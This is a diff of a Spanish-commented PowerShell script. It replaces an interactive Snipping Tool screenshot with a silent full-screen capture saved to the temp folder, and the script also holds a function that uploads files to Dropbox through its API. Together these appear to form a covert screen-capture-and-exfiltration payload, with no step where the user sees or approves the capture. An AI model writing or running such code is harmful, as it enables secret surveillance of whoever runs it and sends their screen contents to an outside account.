@@ -22,15 +22,18 @@ function DropBox-Upload {
     Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 }
 
-# Función para capturar la pantalla utilizando la herramienta de captura de pantalla de Windows
+# Función para capturar la pantalla
 function Capture-Screen {
-    $filePath = "$env:TEMP\sc.png"
-    # Usa la herramienta de captura de pantalla integrada en Windows (Snipping Tool)
-    Start-Process "ms-screenclip:" -ArgumentList "/clip"
-    Start-Sleep -Seconds 5
+    Add-Type -AssemblyName System.Windows.Forms
     Add-Type -AssemblyName System.Drawing
-    $clipboard = [System.Windows.Forms.Clipboard]::GetImage()
-    $clipboard.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
+    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+    $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
+    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+    $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
+    $filePath = "$env:temp\sc.png"
+    $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
+    $graphics.Dispose()
+    $bitmap.Dispose()
     return $filePath
 }
 
@@ -51,3 +54,6 @@ try {
 catch {
     Write-Error "Ocurrió un error: $_"
 }
+
+
+
